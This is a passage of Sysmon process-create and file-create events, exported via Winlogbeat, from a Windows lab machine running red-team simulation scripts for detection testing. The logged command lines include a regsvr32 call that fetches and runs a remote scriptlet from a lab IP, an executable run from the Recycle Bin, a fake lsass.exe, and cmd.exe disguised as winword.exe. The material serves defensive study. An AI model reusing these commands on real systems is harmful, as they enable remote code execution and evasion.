13:13:17.305","ProcessId":"3996","ProcessGuid":"{2D3B23BE-4B6D-5BA2-0000-0010B9B91800}"},"@timestamp":"2018-09-19T13:13:17.305Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:13:17.305\nProcessGuid: {2D3B23BE-4B6D-5BA2-0000-0010B9B91800}\nProcessId: 3996\nImage: C:\\Windows\\SysWOW64\\notepad.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Editor\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: \"C:\\Windows\\System32\\notepad.exe\" \nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=A4F6DF0E33E644E802C8798ED94D80EA,SHA256=B56AFE7165AD341A749D2D3BD925D879728A1FE4A4DF206145C1A69AA233F68B\nParentProcessGuid: {2D3B23BE-4B6C-5BA2-0000-00104DA91800}\nParentProcessId: 4088\nParentImage: C:\\Windows\\SysWOW64\\regsvr32.exe\nParentCommandLine: regsvr32.exe /u /n /s /i:http://172.16.100.10:8000/bin/notepad.sct scrobj.dll","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","event_id":1,"task":"Process Create (rule: ProcessCreate)","version":5,"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"record_number":"1436","host":{"name":"flare-PC"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"ql_38WUBfVn9xHWidDzh"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4B5F-5BA2-0000-001004A71700}","User":"flare-PC\\flare","Product":"?","Image":"C:\\$Recycle.Bin\\S-1-5-21-4019173901-3792766986-1456451320-1001\\recycled_process.exe","Description":"?","UtcTime":"2018-09-19 13:13:04.063","Hashes":"MD5=0D19266C09D4DEAC5836E572BE912A39,SHA256=DAB5DC65269C0F834EADE5177F8FB486C08685EB6773369576303855F70EF82F","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\recycle_bin_process.py","FileVersion":"?","Company":"?","CommandLine":"C:\\$Recycle.Bin\\S-1-5-21-4019173901-3792766986-1456451320-1001\\recycled_process.exe","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"3928","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","TerminalSessionId":"1","LogonId":"0xe320","ParentProcessId":"632","IntegrityLevel":"Low","ProcessGuid":"{2D3B23BE-4B60-5BA2-0000-0010B2D11700}"},"@timestamp":"2018-09-19T13:13:04.063Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:13:04.063\nProcessGuid: {2D3B23BE-4B60-5BA2-0000-0010B2D11700}\nProcessId: 3928\nImage: C:\\$Recycle.Bin\\S-1-5-21-4019173901-3792766986-1456451320-1001\\recycled_process.exe\nFileVersion: ?\nDescription: ?\nProduct: ?\nCompany: ?\nCommandLine: C:\\$Recycle.Bin\\S-1-5-21-4019173901-3792766986-1456451320-1001\\recycled_process.exe\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Low\nHashes: MD5=0D19266C09D4DEAC5836E572BE912A39,SHA256=DAB5DC65269C0F834EADE5177F8FB486C08685EB6773369576303855F70EF82F\nParentProcessGuid: {2D3B23BE-4B5F-5BA2-0000-001004A71700}\nParentProcessId: 632\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\recycle_bin_process.py","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"1415","task":"Process Create (rule: ProcessCreate)","host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","type":"User","domain":"NT-AUTORITÄT"},"version":5,"event_id":1,"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"wl_38WUBfVn9xHWiqjxn"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","ParentProcessGuid":"{2D3B23BE-4B6D-5BA2-0000-001062C31800}","UtcTime":"2018-09-19 13:13:17.665","Image":"C:\\Program Files (x86)\\Python27\\python.exe","Description":"?","Hashes":"MD5=6E8B813C218546F9DF6F17F4B97B06EE,SHA256=C7817E6DA74A7AE196EB2D35CE21319ABE3A62CD23AB4DB39FA5138DF7CA1D44","User":"flare-PC\\flare","FileVersion":"?","ParentCommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\rundll32_inf_callback.py\"","Product":"?","Company":"?","CommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\rundll32_inf_callback.py","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"2940","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","TerminalSessionId":"1","IntegrityLevel":"Medium","ParentProcessId":"3104","ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","ProcessGuid":"{2D3B23BE-4B6D-5BA2-0000-00109BC41800}"},"@timestamp":"2018-09-19T13:13:17.665Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:13:17.665\nProcessGuid: {2D3B23BE-4B6D-5BA2-0000-00109BC41800}\nProcessId: 2940\nImage: C:\\Program Files (x86)\\Python27\\python.exe\nFileVersion: ?\nDescription: ?\nProduct: ?\nCompany: ?\nCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\rundll32_inf_callback.py\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=6E8B813C218546F9DF6F17F4B97B06EE,SHA256=C7817E6DA74A7AE196EB2D35CE21319ABE3A62CD23AB4DB39FA5138DF7CA1D44\nParentProcessGuid: {2D3B23BE-4B6D-5BA2-0000-001062C31800}\nParentProcessId: 3104\nParentImage: C:\\Windows\\SysWOW64\\cmd.exe\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\rundll32_inf_callback.py\"","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"1439","task":"Process Create (rule: ProcessCreate)","host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","type":"User","domain":"NT-AUTORITÄT"},"version":5,"event_id":1,"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"qV_38WUBfVn9xHWidDzf"}}
{"thread_id":1824,"event_data":{"CreationUtcTime":"2018-09-19 13:13:03.607","UtcTime":"2018-09-19 13:13:03.607","Image":"C:\\Program Files (x86)\\Python27\\python.exe","TargetFilename":"C:\\$Recycle.Bin\\S-1-5-21-4019173901-3792766986-1456451320-1001\\recycled_process.exe","ProcessId":"632","ProcessGuid":"{2D3B23BE-4B5F-5BA2-0000-001004A71700}"},"@timestamp":"2018-09-19T13:13:03.607Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"File created:\nRuleName: \nUtcTime: 2018-09-19 13:13:03.607\nProcessGuid: {2D3B23BE-4B5F-5BA2-0000-001004A71700}\nProcessId: 632\nImage: C:\\Program Files (x86)\\Python27\\python.exe\nTargetFilename: C:\\$Recycle.Bin\\S-1-5-21-4019173901-3792766986-1456451320-1001\\recycled_process.exe\nCreationUtcTime: 2018-09-19 13:13:03.607","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"File created (rule: FileCreate)","type":"wineventlog","record_number":"1414","host":{"name":"flare-PC"},"version":2,"event_id":11,"user":{"name":"SYSTEM","domain":"NT-AUTORITÄT","type":"User","identifier":"S-1-5-18"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"xF_38WUBfVn9xHWiuzxO"}}
{"thread_id":1824,"event_data":{"CreationUtcTime":"2018-09-19 12:59:31.195","UtcTime":"2018-09-19 13:13:20.185","Image":"C:\\Program Files (x86)\\Python27\\python.exe","TargetFilename":"C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\bin\\script_launch.inf","ProcessId":"2940","ProcessGuid":"{2D3B23BE-4B6D-5BA2-0000-00109BC41800}"},"@timestamp":"2018-09-19T13:13:20.185Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"File created:\nRuleName: \nUtcTime: 2018-09-19 13:13:20.185\nProcessGuid: {2D3B23BE-4B6D-5BA2-0000-00109BC41800}\nProcessId: 2940\nImage: C:\\Program Files (x86)\\Python27\\python.exe\nTargetFilename: C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\bin\\script_launch.inf\nCreationUtcTime: 2018-09-19 12:59:31.195","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"File created (rule: FileCreate)","record_number":"1441","type":"wineventlog","host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","type":"User","domain":"NT-AUTORITÄT"},"version":2,"event_id":11,"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"n1_38WUBfVn9xHWiQDyz"}}
{"thread_id":1824,"event_data":{"CreationUtcTime":"2018-09-19 13:12:50.171","UtcTime":"2018-09-19 13:12:50.171","Image":"C:\\Program Files (x86)\\Python27\\python.exe","TargetFilename":"C:\\Users\\flare\\Downloads\\RTA-master\\lsass.exe","ProcessId":"4040","ProcessGuid":"{2D3B23BE-4B4D-5BA2-0000-0010C9721700}"},"@timestamp":"2018-09-19T13:12:50.171Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"File created:\nRuleName: \nUtcTime: 2018-09-19 13:12:50.171\nProcessGuid: {2D3B23BE-4B4D-5BA2-0000-0010C9721700}\nProcessId: 4040\nImage: C:\\Program Files (x86)\\Python27\\python.exe\nTargetFilename: C:\\Users\\flare\\Downloads\\RTA-master\\lsass.exe\nCreationUtcTime: 2018-09-19 13:12:50.171","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"1403","event_id":11,"version":2,"host":{"name":"flare-PC"},"user":{"name":"SYSTEM","domain":"NT-AUTORITÄT","type":"User","identifier":"S-1-5-18"},"task":"File created (rule: FileCreate)","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"31_58WUBfVn9xHWieTzN"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4BDF-5BA2-0000-00104ACE1C00}","Product":"?","LogonId":"0xe320","Hashes":"MD5=6E8B813C218546F9DF6F17F4B97B06EE,SHA256=C7817E6DA74A7AE196EB2D35CE21319ABE3A62CD23AB4DB39FA5138DF7CA1D44","Description":"?","Image":"C:\\Program Files (x86)\\Python27\\python.exe","User":"flare-PC\\flare","ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","ParentCommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\smb_connection.py\"","FileVersion":"?","TerminalSessionId":"1","CommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\smb_connection.py","Company":"?","ProcessId":"676","ParentProcessId":"3988","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","IntegrityLevel":"Medium","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","UtcTime":"2018-09-19 13:15:11.159","ProcessGuid":"{2D3B23BE-4BDF-5BA2-0000-00109FCF1C00}"},"@timestamp":"2018-09-19T13:15:11.160Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:15:11.159\nProcessGuid: {2D3B23BE-4BDF-5BA2-0000-00109FCF1C00}\nProcessId: 676\nImage: C:\\Program Files (x86)\\Python27\\python.exe\nFileVersion: ?\nDescription: ?\nProduct: ?\nCompany: ?\nCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\smb_connection.py\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=6E8B813C218546F9DF6F17F4B97B06EE,SHA256=C7817E6DA74A7AE196EB2D35CE21319ABE3A62CD23AB4DB39FA5138DF7CA1D44\nParentProcessGuid: {2D3B23BE-4BDF-5BA2-0000-00104ACE1C00}\nParentProcessId: 3988\nParentImage: C:\\Windows\\SysWOW64\\cmd.exe\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\smb_connection.py\"","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","type":"wineventlog","event_id":1,"version":5,"user":{"domain":"NT-AUTORITÄT","identifier":"S-1-5-18","type":"User","name":"SYSTEM"},"record_number":"1462","host":{"name":"flare-PC"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"4F_58WUBfVn9xHWieTzN"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","Product":"Betriebssystem Microsoft® Windows®","UtcTime":"2018-09-19 13:15:12.136","Image":"C:\\Users\\flare\\Downloads\\RTA-master\\winword.exe","Hashes":"MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE","User":"flare-PC\\flare","Description":"Windows-Befehlsprozessor","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\suspicious_office_children.py","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","TerminalSessionId":"1","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"1696","ParentProcessId":"1132","IntegrityLevel":"Medium","Company":"Microsoft Corporation","ParentProcessGuid":"{2D3B23BE-4BDF-5BA2-0000-001096FB1C00}","CommandLine":"C:\\Users\\flare\\Downloads\\RTA-master\\winword.exe /c msiexec.exe /i blah /quiet","ProcessGuid":"{2D3B23BE-4BE0-5BA2-0000-001037261D00}"},"@timestamp":"2018-09-19T13:15:12.152Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:15:12.136\nProcessGuid: {2D3B23BE-4BE0-5BA2-0000-001037261D00}\nProcessId: 1696\nImage: C:\\Users\\flare\\Downloads\\RTA-master\\winword.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows-Befehlsprozessor\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: C:\\Users\\flare\\Downloads\\RTA-master\\winword.exe /c msiexec.exe /i blah /quiet\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE\nParentProcessGuid: {2D3B23BE-4BDF-5BA2-0000-001096FB1C00}\nParentProcessId: 1132\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\suspicious_office_children.py","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","record_number":"1466","event_id":1,"host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"version":5,"type":"wineventlog","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"41_58WUBfVn9xHWieTzN"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4BE0-5BA2-0000-00109A2E1D00}","Product":"Betriebssystem Microsoft® Windows®","UtcTime":"2018-09-19 13:15:12.669","Image":"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe","Description":"Windows PowerShell","Hashes":"MD5=EB32C070E658937AA9FA9F3AE629B2B8,SHA256=70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE","User":"flare-PC\\flare","FileVersion":"10.0.14409.1005 (rs1_srvoob.161208-1155)","ParentImage":"C:\\Users\\flare\\Downloads\\RTA-master\\winword.exe","ParentCommandLine":"C:\\Users\\flare\\Downloads\\RTA-master\\winword.exe /c powershell.exe exit","TerminalSessionId":"1","CommandLine":"powershell.exe  exit","ParentProcessId":"2224","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"3624","IntegrityLevel":"Medium","Company":"Microsoft Corporation","LogonId":"0xe320","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","ProcessGuid":"{2D3B23BE-4BE0-5BA2-0000-0010B82F1D00}"},"@timestamp":"2018-09-19T13:15:12.669Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:15:12.669\nProcessGuid: {2D3B23BE-4BE0-5BA2-0000-0010B82F1D00}\nProcessId: 3624\nImage: C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155)\nDescription: Windows PowerShell\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: powershell.exe  exit\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=EB32C070E658937AA9FA9F3AE629B2B8,SHA256=70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE\nParentProcessGuid: {2D3B23BE-4BE0-5BA2-0000-00109A2E1D00}\nParentProcessId: 2224\nParentImage: C:\\Users\\flare\\Downloads\\RTA-master\\winword.exe\nParentCommandLine: C:\\Users\\flare\\Downloads\\RTA-master\\winword.exe /c powershell.exe exit","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","record_number":"1470","event_id":1,"version":5,"host":{"name":"flare-PC"},"user":{"domain":"NT-AUTORITÄT","identifier":"S-1-5-18","type":"User","name":"SYSTEM"},"type":"wineventlog","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"3V_58WUBfVn9xHWieTzN"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","Product":"Betriebssystem Microsoft® Windows®","UtcTime":"2018-09-19 13:15:11.589","Image":"C:\\Windows\\SysWOW64\\cmd.exe","Hashes":"MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE","Description":"Windows-Befehlsprozessor","ParentProcessGuid":"{2D3B23BE-4A1C-5BA2-0000-0010C8100B00}","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","User":"flare-PC\\flare","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\suspicious_office_children.py\"","ParentProcessId":"3756","TerminalSessionId":"1","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","IntegrityLevel":"Medium","ProcessId":"3820","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","Company":"Microsoft Corporation","ProcessGuid":"{2D3B23BE-4BDF-5BA2-0000-00105DFA1C00}"},"@timestamp":"2018-09-19T13:15:11.589Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:15:11.589\nProcessGuid: {2D3B23BE-4BDF-5BA2-0000-00105DFA1C00}\nProcessId: 3820\nImage: C:\\Windows\\SysWOW64\\cmd.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows-Befehlsprozessor\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\suspicious_office_children.py\"\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE\nParentProcessGuid: {2D3B23BE-4A1C-5BA2-0000-0010C8100B00}\nParentProcessId: 3756\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","record_number":"1463","event_id":1,"version":5,"user":{"name":"SYSTEM","domain":"NT-AUTORITÄT","type":"User","identifier":"S-1-5-18"},"type":"wineventlog","host":{"name":"flare-PC"},"opcode":"Info"}
